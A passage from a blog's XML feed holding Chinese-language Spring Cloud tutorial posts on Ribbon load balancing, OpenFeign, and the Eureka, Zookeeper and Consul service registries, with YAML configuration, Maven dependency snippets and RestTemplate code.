class="headerlink" title="3,启动服务即可"></a>3,启动服务即可</h4>]]></content>
      
      
      <categories>
          
          <category> OpenFeign </category>
          
          <category> 服务远程调用 </category>
          
          <category> spring cloud </category>
          
      </categories>
      
      
        <tags>
            
            <tag> spring cloud </tag>
            
            <tag> OpenFeign </tag>
            
            <tag> 服务远程调用 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Ribbon负载均衡服务调用</title>
      <link href="/2021/05/25/Ribbon%E8%B4%9F%E8%BD%BD%E5%9D%87%E8%A1%A1%E6%9C%8D%E5%8A%A1%E8%B0%83%E7%94%A8/"/>
      <url>/2021/05/25/Ribbon%E8%B4%9F%E8%BD%BD%E5%9D%87%E8%A1%A1%E6%9C%8D%E5%8A%A1%E8%B0%83%E7%94%A8/</url>
      
        <content type="html"><![CDATA[<h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p><img src="/img/springcloud2020/Ribbon1.png" alt=""></p><p>Ribbon源码地址: <a href="https://github.com/Netflix/ribbon" target="_blank" rel="noopener">https://github.com/Netflix/ribbon</a></p><p><img src="/img/springcloud2020/Ribbon2.png" alt=""></p><p>一句话介绍：负载均衡 + RestTemplate调用</p><h4 id="demo地址"><a href="#demo地址" class="headerlink" title="demo地址:"></a>demo地址:</h4><p>项目地址：<a href="https://github.com/raineddown/spring-cloud-demo" target="_blank" rel="noopener">https://github.com/raineddown/spring-cloud-demo</a></p><p>涉及服务: cloud-consumer-order80</p><h2 id="使用流程"><a href="#使用流程" class="headerlink" title="使用流程"></a>使用流程</h2><p>注意：</p><p>Eureka最新的包(client)中包含Ribbon依赖，可不额外添加Ribbon依赖</p><p><img src="/img/springcloud2020/Ribbon5.png" alt=""></p><h4 id="Ribbon常用负载均衡算法"><a href="#Ribbon常用负载均衡算法" class="headerlink" title="Ribbon常用负载均衡算法:"></a>Ribbon常用负载均衡算法:</h4><p><strong>IRule接口,Riboon使用该接口,根据特定算法从所有服务中,选择一个服务,</strong></p><p>**Rule接口有7个实现类,每个实现类代表一个负载均衡算法</p><p><img src="/img/springcloud2020/Ribbon3.png" alt=""></p><p><img src="/img/springcloud2020/Ribbon4.png" alt=""></p><h4 id="使用Ribbon"><a href="#使用Ribbon" class="headerlink" title="使用Ribbon"></a>使用Ribbon</h4><p><img src="/img/springcloud2020/Ribbon的15.png" alt=""></p><p>注意@SpringBootApplication注解包含@ComponentScan注解，所以自定义Ribbon负载均衡规则必须和spring boot启动类放在不同的包下。</p><p>1.额外创建一个包</p><p><img src="/img/springcloud2020/Ribbon的16.png" alt=""></p><p>2.创建配置类,指定负载均衡算法</p><p><img src="/img/springcloud2020/Ribbon的17.png" alt=""></p><p>3.在主启动类上加一个注解</p><p><img src="/img/springcloud2020/Ribbon的18.png" alt=""></p><p><strong>表示,访问CLOUD_pAYMENT_SERVICE的服务时,使用我们自定义的负载均衡算法</strong></p><h4 id="自定义负载均衡算法"><a href="#自定义负载均衡算法" class="headerlink" title="自定义负载均衡算法:"></a>自定义负载均衡算法:</h4><p>1,ribbon的轮询算法原理</p><p><img src="/img/springcloud2020/Ribbon的19.png" alt=""></p><p><img src="/img/springcloud2020/Ribbon的21.png" alt=""></p><p>2,自定义负载均衡算法:</p><p><img src="/img/springcloud2020/Ribbon的13.png" alt=""></p><p><img src="/img/springcloud2020/Ribbon的22.png" alt=""></p><p>3,自定义接口</p><p>RestTemplate去掉@LoadBalanced注解</p><p><img src="/img/springcloud2020/Ribbon的24.png" alt=""></p><p><img src="/img/springcloud2020/Ribbon的29.png" alt=""></p><p>4,接口实现类</p><p><img src="/img/springcloud2020/Ribbon的25.png" alt=""></p><p><img src="/img/springcloud2020/Ribbon的26.png" alt=""></p><p>5,修改controller:</p><p><img src="/img/springcloud2020/Ribbon的27.png" alt=""></p><p><img src="/img/springcloud2020/Ribbon的28.png" alt=""></p><p>6,启动服务,测试即可</p>]]></content>
      
      
      <categories>
          
          <category> Ribbon </category>
          
          <category> 负载均衡 </category>
          
          <category> spring cloud </category>
          
      </categories>
      
      
        <tags>
            
            <tag> spring cloud </tag>
            
            <tag> Ribbon </tag>
            
            <tag> 负载均衡 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Eureka、zookeeper、consul三个注册中心的异同</title>
      <link href="/2021/05/21/Eureka%E3%80%81zookeeper%E3%80%81consul%E4%B8%89%E4%B8%AA%E6%B3%A8%E5%86%8C%E4%B8%AD%E5%BF%83%E7%9A%84%E5%BC%82%E5%90%8C/"/>
      <url>/2021/05/21/Eureka%E3%80%81zookeeper%E3%80%81consul%E4%B8%89%E4%B8%AA%E6%B3%A8%E5%86%8C%E4%B8%AD%E5%BF%83%E7%9A%84%E5%BC%82%E5%90%8C/</url>
      
        <content type="html"><![CDATA[<h3 id="区别"><a href="#区别" class="headerlink" title="区别"></a>区别</h3><p><img src="/img/springcloud2020/注册中心区别.png" alt=""></p><p><img src="/img/springcloud2020/注册中心区别4.png" alt=""></p><p><img src="/img/springcloud2020/注册中心5.png" alt=""></p><p><img src="/img/springcloud2020/注册中心区别2.png" alt=""></p><p><img src="/img/springcloud2020/注册中心区别3.png" alt=""></p>]]></content>
      
      
      <categories>
          
          <category> 注册中心 </category>
          
          <category> spring cloud </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 注册中心 </tag>
            
            <tag> spring cloud </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>微服务注册中心consul</title>
      <link href="/2021/05/20/%E5%BE%AE%E6%9C%8D%E5%8A%A1%E6%B3%A8%E5%86%8C%E4%B8%AD%E5%BF%83consul/"/>
      <url>/2021/05/20/%E5%BE%AE%E6%9C%8D%E5%8A%A1%E6%B3%A8%E5%86%8C%E4%B8%AD%E5%BF%83consul/</url>
      
        <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>来源：尚硅谷spring cloud2020</p><p>项目demo地址：<a href="https://github.com/raineddown/spring-cloud-demo" target="_blank" rel="noopener">https://github.com/raineddown/spring-cloud-demo</a></p><p>涉及服务: cloud-consumerconsul-order80、cloud-providerconsul-payment8006</p><h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p><img src="/img/springcloud2020/consul.png" alt=""></p><p><img src="/img/springcloud2020/consul的1.png" alt=""></p><p>consul官网：<a href="https://www.consul.io/docs/intro" target="_blank" rel="noopener">https://www.consul.io/docs/intro</a></p><p>spring-cloud-consul中文网: <a href="https://www.springcloud.cc/spring-cloud-consul.html" target="_blank" rel="noopener">https://www.springcloud.cc/spring-cloud-consul.html</a></p><p>下载地址: <a href="https://www.consul.io/downloads" target="_blank" rel="noopener">https://www.consul.io/downloads</a></p><h2 id="配置流程"><a href="#配置流程" class="headerlink" title="配置流程"></a>配置流程</h2><p>下载consul后，命令行输入consul agen-dev启动</p><p><img src="/img/springcloud2020/consul的2.png" alt=""></p><p>consul图形化管理界面(类似于Eureka)，默认端口localhost:8500</p><p><img src="/img/springcloud2020/consul的3.png" alt=""></p><h4 id="配置文件"><a href="#配置文件" class="headerlink" title="配置文件:"></a>配置文件:</h4><p><img src="/img/springcloud2020/consul的4.png" alt=""></p><h4 id="主启动类"><a href="#主启动类" class="headerlink" title="主启动类"></a>主启动类</h4><p><img src="/img/springcloud2020/consul的5.png" alt=""></p><h4 id="controller"><a href="#controller" class="headerlink" title="controller"></a>controller</h4><p><img src="/img/springcloud2020/consul的6.png" alt=""></p>]]></content>
      
      
      <categories>
          
          <category> consul </category>
          
          <category> 注册中心 </category>
          
          <category> spring cloud </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 注册中心 </tag>
            
            <tag> spring cloud </tag>
            
            <tag> consul </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>微服务注册中心zookeeper</title>
      <link href="/2021/05/17/%E5%BE%AE%E6%9C%8D%E5%8A%A1%E6%B3%A8%E5%86%8C%E4%B8%AD%E5%BF%83zookeeper/"/>
      <url>/2021/05/17/%E5%BE%AE%E6%9C%8D%E5%8A%A1%E6%B3%A8%E5%86%8C%E4%B8%AD%E5%BF%83zookeeper/</url>
      
        <content type="html"><![CDATA[<h2 id="Zookeeper服务注册与发现"><a href="#Zookeeper服务注册与发现" class="headerlink" title="Zookeeper服务注册与发现"></a>Zookeeper服务注册与发现</h2><h4 id="demo地址"><a href="#demo地址" class="headerlink" title="demo地址:"></a>demo地址:</h4><p>项目地址：<a href="https://github.com/raineddown/spring-cloud-demo" target="_blank" rel="noopener">https://github.com/raineddown/spring-cloud-demo</a></p><p>涉及服务: cloud-consumerzk-order80、cloud-provider-payment8004</p><h4 id="配置流程"><a href="#配置流程" class="headerlink" title="配置流程"></a>配置流程</h4><p>服务提供方配置</p><figure class="highlight yml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">server:</span></span><br><span class="line">  <span class="attr">port:</span> <span class="number">8004</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#服务别名----注册zookeeper到注册中心名称</span></span><br><span class="line"><span class="attr">spring:</span></span><br><span class="line">  <span class="attr">application:</span></span><br><span class="line">    <span class="attr">name:</span> <span class="string">cloud-provider-payment</span></span><br><span class="line">  <span class="attr">cloud:</span></span><br><span class="line">    <span class="attr">zookeeper:</span></span><br><span class="line">      <span class="attr">connect-string:</span> <span class="number">192.168</span><span class="number">.30</span><span class="number">.87</span><span class="string">:2181</span></span><br></pre></td></tr></table></figure><p>服务消费方配置</p><figure class="highlight yml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">server:</span></span><br><span class="line">  <span class="attr">port:</span> <span class="number">80</span></span><br><span class="line"></span><br><span class="line"><span class="attr">spring:</span></span><br><span class="line">  <span class="attr">application:</span></span><br><span class="line">    <span class="attr">name:</span> <span class="string">cloud-consumer-order</span></span><br><span class="line">  <span class="attr">cloud:</span></span><br><span class="line">    <span class="attr">zookeeper:</span></span><br><span class="line">      <span class="attr">connect-string:</span> <span class="number">192.168</span><span class="number">.30</span><span class="number">.87</span><span class="string">:2181</span></span><br></pre></td></tr></table></figure><p>启动类添加注解</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@EnableDiscoveryClient</span></span><br></pre></td></tr></table></figure><p><img src="/img/springcloud2020/zookeeper的1.png" alt=""></p><h3 id="注意事项"><a href="#注意事项" class="headerlink" title="注意事项"></a>注意事项</h3><p>依赖冲突问题：</p><p>@EnableDiscoveryClient 注解属于org.springframework.cloud.client.discovery包，该包自带org.apache.zookeeper包依赖可能和服务器上zookeeper版本不统一请修改pom.xml配置文件为以下</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">&lt;!-- SpringBoot整合zookeeper客户端 --&gt;</span><br><span class="line">&lt;dependency&gt;</span><br><span class="line">    &lt;groupId&gt;org.springframework.cloud&lt;&#x2F;groupId&gt;</span><br><span class="line">    &lt;artifactId&gt;spring-cloud-starter-zookeeper-discovery&lt;&#x2F;artifactId&gt;</span><br><span class="line">    &lt;!--先排除自带的zookeeper3.5.3--&gt;</span><br><span class="line">    &lt;exclusions&gt;</span><br><span class="line">        &lt;exclusion&gt;</span><br><span class="line">            &lt;groupId&gt;org.apache.zookeeper&lt;&#x2F;groupId&gt;</span><br><span class="line">            &lt;artifactId&gt;zookeeper&lt;&#x2F;artifactId&gt;</span><br><span class="line">        &lt;&#x2F;exclusion&gt;</span><br><span class="line">    &lt;&#x2F;exclusions&gt;</span><br><span class="line">&lt;&#x2F;dependency&gt;</span><br><span class="line">&lt;!--添加zookeeper3.4.9版本--&gt;</span><br><span class="line">&lt;dependency&gt;</span><br><span class="line">    &lt;groupId&gt;org.apache.zookeeper&lt;&#x2F;groupId&gt;</span><br><span class="line">    &lt;artifactId&gt;zookeeper&lt;&#x2F;artifactId&gt;</span><br><span class="line">    &lt;version&gt;3.4.9&lt;&#x2F;version&gt;</span><br><span class="line">&lt;&#x2F;dependency&gt;</span><br></pre></td></tr></table></figure><font color='red'>区别于Eureka的自我保护机制AP，我们在zk上注册的node是临时节点,当我们的服务一定时间内没有发送心跳那么zk就会将这个服务的node删除了 </font>]]></content>
      
      
      <categories>
          
          <category> zookeeper </category>
          
          <category> 注册中心 </category>
          
          <category> spring cloud </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 注册中心 </tag>
            
            <tag> spring cloud </tag>
            
            <tag> zookeeper </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>微服务注册中心Eureka</title>
      <link href="/2021/05/15/%E5%BE%AE%E6%9C%8D%E5%8A%A1%E6%B3%A8%E5%86%8C%E4%B8%AD%E5%BF%83Eureka/"/>
      <url>/2021/05/15/%E5%BE%AE%E6%9C%8D%E5%8A%A1%E6%B3%A8%E5%86%8C%E4%B8%AD%E5%BF%83Eureka/</url>
      
        <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><h4 id="什么是服务治理"><a href="#什么是服务治理" class="headerlink" title="什么是服务治理"></a>什么是服务治理</h4><p>​    Spring Cloud封装了Netfilx公司开发的Eureka模块来实现服务治理</p><p>​    在传统的rpc远程调用框架中，管理每个服务与服务之间依赖关系比较复杂，管理比较复杂，所以需要使用服务治理，管理服务于服务之间依赖关系，可以实现服务调用、负载均衡、容错等，实现服务注册与发现。</p><h4 id="什么是服务治理-1"><a href="#什么是服务治理-1" class="headerlink" title="什么是服务治理"></a>什么是服务治理</h4><p>​    Eureka采用了CS的设计架构，Eureka Server作为服务注册功能的服务器，它是服务注册中心。而系统中的其他微服务，使用Eureka的客户端连接到Eureka Server并维持心跳连接。这样系统的维护人员就可以通过Eureka Server来监控系统中各个微服务是否正常运行。</p><p>​    在服务注册于发现中，有一个注册中心，当服务器启动的时候，会把当前自己服务器的信息比如服务地址通讯地址等以别名方式注册到注册中心上。另一方(消费者|服务提供者)，以该别名的方式去注册中心上获取到实际的服务通讯地址，然后再实现本地RPC调用RPC远程调用框架核心设计思想：在于注册中，因为使用注册中心管理每个服务与服务之间的一个依赖关系(服务治理概念)。在任何rpc远程框架中，都会有一个注册中心(存放服务地址相关信息(接口地址))。</p><h4 id="项目地址"><a href="#项目地址" class="headerlink" title="项目地址"></a>项目地址</h4><p>来源：尚硅谷spring cloud2020</p><p>项目地址：<a href="https://github.com/raineddown/spring-cloud-demo" target="_blank" rel="noopener">https://github.com/raineddown/spring-cloud-demo</a></p><h2 id="Eureka系统架构与Dubbo架构对比"><a href="#Eureka系统架构与Dubbo架构对比" class="headerlink" title="Eureka系统架构与Dubbo架构对比"></a>Eureka系统架构与Dubbo架构对比</h2><p><img src="/img/Eureka/Eureka和Dubbo对比.png" alt="Eureka和Dubbo对比"></p><h2 id="Eureka的两个组件：Eureka-Server和Eureka-Client"><a href="#Eureka的两个组件：Eureka-Server和Eureka-Client" class="headerlink" title="Eureka的两个组件：Eureka Server和Eureka Client"></a>Eureka的两个组件：Eureka Server和Eureka Client</h2><p><img src="/img/Eureka/Eureka Server和Eureka Client.png" alt="Eureka Server和Eureka Client"></p><p>依赖：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;dependency&gt;</span><br><span class="line">    &lt;groupId&gt;org.springframework.cloud&lt;&#x2F;groupId&gt;</span><br><span class="line">    &lt;artifactId&gt;spring-cloud-starter-netflix-eureka-client&lt;&#x2F;artifactId&gt;</span><br><span class="line">&lt;&#x2F;dependency&gt;</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;dependency&gt;</span><br><span class="line">    &lt;groupId&gt;org.springframework.cloud&lt;&#x2F;groupId&gt;</span><br><span class="line">    &lt;artifactId&gt;spring-cloud-starter-netflix-eureka-server&lt;&#x2F;artifactId&gt;</span><br><span class="line">&lt;&#x2F;dependency&gt;</span><br></pre></td></tr></table></figure><p>相关注解</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">@EnableEurekaClient</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">@EnableEurekaServer</span><br></pre></td></tr></table></figure><h4 id="Eureka单体demo"><a href="#Eureka单体demo" class="headerlink" title="Eureka单体demo"></a>Eureka单体demo</h4><p>项目地址：<a href="https://github.com/raineddown/spring-cloud-demo" target="_blank" rel="noopener">https://github.com/raineddown/spring-cloud-demo</a></p><p>涉及服务：cloud-api-commons、cloud-provider-payment8001、cloud-consumer-order80、cloud-eureka-server7001</p><h2 id="集群版eureka"><a href="#集群版eureka" class="headerlink" title="集群版eureka"></a>集群版eureka</h2><p>涉及服务：cloud-api-commons、cloud-provider-payment8001、cloud-consumer-order80、cloud-eureka-server7001</p><p><img src="/img/Eureka/Eureka的11.png" alt=""></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">就是pay模块启动时,注册自己,并且自身信息也放入eureka</span><br><span class="line">        2.order模块,首先也注册自己,放入信息,当要调用pay时,先从eureka拿到pay的调用地址</span><br><span class="line">        3.通过HttpClient调用</span><br><span class="line">        并且还会缓存一份到本地,每30秒更新一次</span><br></pre></td></tr></table></figure><p><img src="/img/Eureka/Eureka的12.png" alt=""></p><p><strong>集群构建原理:</strong></p><p> 互相注册</p><p><img src="/img/Eureka/Eureka的13.png" alt=""></p><p>EurekaServer端(互相注册)</p><p>服务1配置文件：</p><figure class="highlight yml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">server:</span></span><br><span class="line">  <span class="attr">port:</span> <span class="number">7001</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#集群版</span></span><br><span class="line"><span class="attr">eureka:</span></span><br><span class="line">  <span class="attr">instance:</span></span><br><span class="line">    <span class="attr">hostname:</span> <span class="string">eureka7001.com</span>    <span class="comment">#eureka服务端的实例名字</span></span><br><span class="line">  <span class="attr">client:</span></span><br><span class="line">    <span class="attr">register-with-eureka:</span> <span class="literal">false</span>    <span class="comment">#表示不向注册中心注册自己</span></span><br><span class="line">    <span class="attr">fetch-registry:</span> <span class="literal">false</span>   <span class="comment">#表示自己就是注册中心，职责是维护服务实例，并不需要去检索服务</span></span><br><span class="line">    <span class="attr">service-url:</span></span><br><span class="line">      <span class="comment">#设置与eureka server交互的地址查询服务和注册服务都需要依赖这个地址</span></span><br><span class="line">      <span class="attr">defaultZone:</span> <span class="string">http://eureka7002.com:7002/eureka/</span>  <span class="string">这个是集群版开启</span> <span class="string">互相注册</span></span><br></pre></td></tr></table></figure><p>服务2配置文件：</p><figure class="highlight yml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">server:</span></span><br><span class="line">  <span class="attr">port:</span> <span class="number">7002</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#集群版</span></span><br><span class="line"><span class="attr">eureka:</span></span><br><span class="line">  <span class="attr">instance:</span></span><br><span class="line">    <span class="attr">hostname:</span> <span class="string">eureka7002.com</span>    <span class="comment">#eureka服务端的实例名字</span></span><br><span class="line">  <span class="attr">client:</span></span><br><span class="line">    <span class="attr">register-with-eureka:</span> <span class="literal">false</span>    <span class="comment">#表识不向注册中心注册自己</span></span><br><span class="line">    <span class="attr">fetch-registry:</span> <span class="literal">false</span>   <span class="comment">#表示自己就是注册中心，职责是维护服务实例，并不需要去检索服务</span></span><br><span class="line">    <span class="attr">service-url:</span></span><br><span class="line">      <span class="comment">#设置与eureka server交互的地址查询服务和注册服务都需要依赖这个地址</span></span><br><span class="line">      <span class="attr">defaultZone:</span> <span class="string">http://eureka7001.com:7001/eureka/</span></span><br></pre></td></tr></table></figure><p>EurekaClient端</p><p>注意:服务的消费者端，即向注册中心发现服务地址端的RestTemplate需添加@LoadBalanced注解保证负载均衡以使用集群中多个服务中的一个。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Configuration</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">ApplicationContextConfig</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 配置bean 不然后面没法依赖注入，就像以前ssm整合时配置依赖注入一样，</span></span><br><span class="line">    <span class="comment">// 需要在配置文件配置之后，代码中才可以依赖注入</span></span><br><span class="line">    <span class="comment">// 当前文件就是spring的配置文件</span></span><br><span class="line">    <span class="meta">@Bean</span></span><br><span class="line">    <span class="meta">@LoadBalanced</span> <span class="comment">//让这个RestTemplate在请求时拥有客户端负载均衡的能力  //将此注解注释掉，使用自己的轮询算法不使用默认的</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> RestTemplate <span class="title">getRestTemplate</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> RestTemplate();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>PAYMENT_URL 为服务消费者在注册中心找到服务提供者的服务名</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@RestController</span></span><br><span class="line"><span class="meta">@RequestMapping</span>(<span class="string">"consumer"</span>)</span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">OrderController</span> </span>&#123;</span><br><span class="line"></span><br><span class="line"><span class="comment">//    public static final String PAYMENT_URL = "http://localhost:8001";</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> String PAYMENT_URL = <span class="string">"http://CLOUD-PAYMENT-SERVICE"</span>;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Resource</span></span><br><span class="line">    <span class="keyword">private</span> RestTemplate restTemplate;</span><br><span class="line">    </span><br><span class="line"></span><br><span class="line">    <span class="meta">@PostMapping</span>(<span class="string">"/payment/create"</span>)</span><br><span class="line">    <span class="function"><span class="keyword">public</span> CommonResult&lt;Payment&gt; <span class="title">create</span><span class="params">(@RequestBody Payment payment)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> restTemplate.postForObject(PAYMENT_URL + <span class="string">"/payment/create"</span>, payment, CommonResult<span class="class">.<span class="keyword">class</span>)</span>;</span><br></pre></td></tr></table></figure><p>相关配置:</p><figure class="highlight yml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">server:</span></span><br><span class="line">  <span class="attr">port:</span> <span class="number">8001</span></span><br><span class="line"></span><br><span class="line"><span class="attr">spring:</span></span><br><span class="line">  <span class="attr">application:</span></span><br><span class="line">    <span class="attr">name:</span> <span class="string">cloud-payment-service</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="attr">eureka:</span></span><br><span class="line">  <span class="attr">client:</span></span><br><span class="line">    <span class="attr">register-with-eureka:</span> <span class="literal">true</span> <span class="comment">#是否向注册中心注册自己</span></span><br><span class="line">    <span class="attr">fetchRegistry:</span> <span class="literal">true</span> <span class="comment">#是否从注册中心抓取已有的注册信息 默认true，集群必须设置为true</span></span><br><span class="line">    <span class="attr">service-url:</span></span><br><span class="line">      <span class="comment">#      设置与eureka server交互的地址查询服务和注册服务都需要依赖这个地址</span></span><br><span class="line">      <span class="attr">defaultZone:</span> <span class="string">http://eureka7001.com:7001/eureka,http://eureka7002.com:7002/eureka</span>  <span class="comment">#集群版</span></span><br><span class="line">  <span class="attr">instance:</span></span><br><span class="line">    <span class="attr">instance-id:</span> <span class="string">payment8001</span></span><br><span class="line">    <span class="attr">prefer-ip-address:</span> <span class="literal">true</span>  <span class="comment">#访问路径可以显示IP地址</span></span><br></pre></td></tr></table></figure><h2 id="Eureka自我保护"><a href="#Eureka自我保护" class="headerlink" title="Eureka自我保护"></a>Eureka自我保护</h2><p><img src="/img/Eureka/Eureka的26.png" alt=""></p><p><img src="/img/Eureka/Eureka的27.png" alt=""></p><p><img src="/img/Eureka/Eureka的28.png" alt=""></p><p><img src="/img/Eureka/Eureka的29.png" alt=""></p><p><img src="/img/Eureka/Eureka的30.png" alt=""></p><p><strong>设置接受心跳时间间隔</strong></p><p><strong>客户端(比如pay模块):</strong></p><p><img src="/img/Eureka/Eureka的31.png" alt=""></p><p>上图表示每隔一秒Eureka客户端向服务端发送心跳，2秒后无心跳剔除服务注册中心</p><figure class="highlight yml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">eureka:</span></span><br><span class="line">  <span class="attr">instance:</span></span><br><span class="line">    <span class="attr">hostname:</span> <span class="string">eureka7001.com</span>    <span class="comment">#eureka服务端的实例名字</span></span><br><span class="line">  <span class="attr">client:</span></span><br><span class="line">    <span class="attr">register-with-eureka:</span> <span class="literal">false</span>    <span class="comment">#表示不向注册中心注册自己</span></span><br><span class="line">    <span class="attr">fetch-registry:</span> <span class="literal">false</span>   <span class="comment">#表示自己就是注册中心，职责是维护服务实例，并不需要去检索服务</span></span><br><span class="line">    <span class="attr">service-url:</span></span><br><span class="line">      <span class="comment">#设置与eureka server交互的地址查询服务和注册服务都需要依赖这个地址</span></span><br><span class="line">      <span class="attr">defaultZone:</span> <span class="string">http://eureka7001.com:7001/eureka/</span></span><br><span class="line"><span class="comment">#      defaultZone: http://eureka7002.com:7002/eureka/  这个是集群版开启 互相注册</span></span><br><span class="line">  <span class="attr">server:</span></span><br><span class="line"><span class="comment">#    关闭自我保护机制，保证不可用服务被及时踢除</span></span><br><span class="line">    <span class="attr">enable-self-preservation:</span> <span class="literal">false</span></span><br><span class="line">    <span class="attr">eviction-interval-timer-in-ms:</span> <span class="number">2000</span></span><br></pre></td></tr></table></figure><p>上面配置表示关闭Eureka自我保护机制</p><p><strong>此时启动erueka和pay.此时如果直接关闭了pay,那么erueka会直接删除其注册信息</strong></p><font color='red'> 注意：Eureka2.0已停止更新，见网址https://github.com/Netflix/eureka/wiki</font><p><img src="/img/Eureka/Eureka停更.png" alt=""></p><h2 id="附：服务发现DiscoveryClient"><a href="#附：服务发现DiscoveryClient" class="headerlink" title="附：服务发现DiscoveryClient"></a>附：服务发现DiscoveryClient</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">org.springframework.cloud.client.discovery.DiscoveryClient</span><br></pre></td></tr></table></figure><p><img src="/img/Eureka/Eureka的22.png" alt=""></p><p><img src="/img/Eureka/Eureka的23.png" alt=""></p>]]></content>
      
      
      <categories>
          
          <category> Eureka </category>
          
          <category> 注册中心 </category>
          
          <category> spring cloud </category>
          
      </categories>
      
      
        <tags>
            
